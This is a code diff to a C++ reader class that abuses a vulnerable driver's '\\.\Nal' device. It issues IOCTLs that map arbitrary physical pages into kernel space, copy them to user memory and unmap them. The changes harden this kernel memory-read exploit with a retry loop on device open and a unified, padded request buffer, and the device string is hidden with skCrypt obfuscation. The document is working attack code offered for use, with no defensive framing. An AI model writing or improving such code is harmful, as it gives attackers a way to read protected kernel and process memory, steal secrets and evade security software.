@@ -28,6 +28,10 @@
 #define NAL_CASE_MEMCPY                 0x33u
 #define NAL_CASE_UNMAP_IO_SPACE         0x1Au
 
+// One request buffer for all three cases. Sized to the largest known
+// Nal struct (Unmap = 0x30). Some driver builds refuse the IOCTL when
+// InputBufferLength < the union footprint; a fixed-size buffer avoids
+// per-case size gating and keeps one DeviceIoControl call shape.
 #pragma pack(push, 1)
 struct NalMapIoSpace {
     uint64_t case_number;               // +0x00 = 0x19
@@ -36,6 +40,7 @@ struct NalMapIoSpace {
     uint64_t return_virtual_address;    // +0x18 OUT: mapped kernel VA
     uint64_t physical_address_to_map;   // +0x20 IN
     uint32_t size;                      // +0x28 IN
+    uint32_t pad;                       // +0x2C
 };
 struct NalMemCopy {
     uint64_t case_number;               // +0x00 = 0x33
@@ -43,6 +48,7 @@ struct NalMemCopy {
     uint64_t source;                    // +0x10 IN
     uint64_t destination;               // +0x18 IN
     uint64_t length;                    // +0x20 IN
+    uint64_t pad;                       // +0x28
 };
 struct NalUnmapIoSpace {
     uint64_t case_number;               // +0x00 = 0x1A
@@ -52,6 +58,10 @@ struct NalUnmapIoSpace {
     uint64_t reserved3;                 // +0x20
     uint64_t number_of_bytes;           // +0x28 IN
 };
+static_assert(sizeof(NalMapIoSpace)   == 0x30, "map struct size");
+static_assert(sizeof(NalMemCopy)      == 0x30, "copy struct size");
+static_assert(sizeof(NalUnmapIoSpace) == 0x30, "unmap struct size");
+#define NAL_REQ_SIZE 0x30u
 #pragma pack(pop)
 
 class WinDrvReader {
@@ -65,16 +75,24 @@ public:
     bool Open() {
         if (IsOpen()) return true;
         DBG_PRINT("[nal] Opening device...\n");
-        m_hDevice = CreateFileA(skCrypt("\\\\.\\Nal"),
-                                GENERIC_READ | GENERIC_WRITE,
-                                FILE_SHARE_READ | FILE_SHARE_WRITE,
-                                nullptr, OPEN_EXISTING,
-                                FILE_ATTRIBUTE_NORMAL, nullptr);
+        // Symlink race: StartService returns before I/O manager publishes
+        // \DosDevices\Nal on some builds. Retry briefly on ERROR_FILE_NOT_FOUND.
+        DWORD lastErr = 0;
+        for (int attempt = 0; attempt < 10; attempt++) {
+            m_hDevice = CreateFileA(skCrypt("\\\\.\\Nal"),
+                                    GENERIC_READ | GENERIC_WRITE,
+                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                    nullptr, OPEN_EXISTING,
+                                    FILE_ATTRIBUTE_NORMAL, nullptr);
+            if (m_hDevice != INVALID_HANDLE_VALUE) break;
+            lastErr = GetLastError();
+            if (lastErr != 2) break;   // only retry the not-found race
+            Sleep(100);
+        }
         if (m_hDevice == INVALID_HANDLE_VALUE) {
-            DWORD err = GetLastError();
-            DBG_PRINT("[nal] Failed to open device: err=%lu\n", err);
-            if (err == 2) DBG_PRINT("[nal]   (device not found -- driver not loaded)\n");
-            else if (err == 5) DBG_PRINT("[nal]   (access denied -- need admin or handle already held)\n");
+            DBG_PRINT("[nal] Failed to open device: err=%lu\n", lastErr);
+            if (lastErr == 2) DBG_PRINT("[nal]   (device not found -- driver not loaded)\n");
+            else if (lastErr == 5) DBG_PRINT("[nal]   (access denied -- need admin or handle already held)\n");
             return false;
         }
         DBG_PRINT("[nal] Device opened: handle=0x%p\n", (void*)m_hDevice);
@@ -779,17 +797,21 @@ private:
 
         pagePA &= ~0xFFFULL;
 
+        // Unified request buffer — one shape for all three cases, so a
+        // driver build that checks InputBufferLength never rejects on size.
+        uint8_t reqBuf[NAL_REQ_SIZE] = {};
+
         // Step 1: MmMapIoSpace(pagePA, 4096) -> kernel VA
-        NalMapIoSpace map = {};
-        map.case_number             = NAL_CASE_MAP_IO_SPACE;
-        map.physical_address_to_map = pagePA;
-        map.size                    = 4096;
+        auto* map = reinterpret_cast<NalMapIoSpace*>(reqBuf);
+        map->case_number             = NAL_CASE_MAP_IO_SPACE;
+        map->physical_address_to_map = pagePA;
+        map->size                    = 4096;
         DWORD returned = 0;
         bool ok = DeviceIoControl(hUse, IOCTL_NAL,
-                                  &map, (DWORD)sizeof(map),
-                                  &map, (DWORD)sizeof(map),
+                                  reqBuf, NAL_REQ_SIZE,
+                                  reqBuf, NAL_REQ_SIZE,
                                   &returned, nullptr) != FALSE;
-        uint64_t kva = map.return_virtual_address;
+        uint64_t kva = map->return_virtual_address;
         if (!ok || !kva) {
             static bool s_logged = false;
             if (!s_logged) {
@@ -806,15 +828,16 @@ private:
         }
 
         // Step 2: memcpy(user_out, kva, 4096) -- executed in kernel context, user VA
-        // is accessible because the caller owns this process. length is 8 bytes here.
-        NalMemCopy copy = {};
-        copy.case_number = NAL_CASE_MEMCPY;
-        copy.source      = kva;
-        copy.destination = reinterpret_cast<uint64_t>(out);
-        copy.length      = 4096;
+        // is accessible because the caller owns this process.
+        memset(reqBuf, 0, NAL_REQ_SIZE);
+        auto* copy = reinterpret_cast<NalMemCopy*>(reqBuf);
+        copy->case_number = NAL_CASE_MEMCPY;
+        copy->source      = kva;
+        copy->destination = reinterpret_cast<uint64_t>(out);
+        copy->length      = 4096;
         ok = DeviceIoControl(hUse, IOCTL_NAL,
-                             &copy, (DWORD)sizeof(copy),
-                             &copy, (DWORD)sizeof(copy),
+                             reqBuf, NAL_REQ_SIZE,
+                             reqBuf, NAL_REQ_SIZE,
                              &returned, nullptr) != FALSE;
         if (!ok) {
             static bool s_logged = false;
@@ -826,13 +849,14 @@ private:
         }
 
         // Step 3: MmUnmapIoSpace(kva, 4096) -- always attempt, even if memcpy failed.
-        NalUnmapIoSpace unmap = {};
-        unmap.case_number     = NAL_CASE_UNMAP_IO_SPACE;
-        unmap.virt_address    = kva;
-        unmap.number_of_bytes = 4096;
+        memset(reqBuf, 0, NAL_REQ_SIZE);
+        auto* unmap = reinterpret_cast<NalUnmapIoSpace*>(reqBuf);
+        unmap->case_number     = NAL_CASE_UNMAP_IO_SPACE;
+        unmap->virt_address    = kva;
+        unmap->number_of_bytes = 4096;
         DeviceIoControl(hUse, IOCTL_NAL,
-                        &unmap, (DWORD)sizeof(unmap),
-                        &unmap, (DWORD)sizeof(unmap),
+                        reqBuf, NAL_REQ_SIZE,
+                        reqBuf, NAL_REQ_SIZE,
                         &returned, nullptr);
 
         if (ownedOpen) {
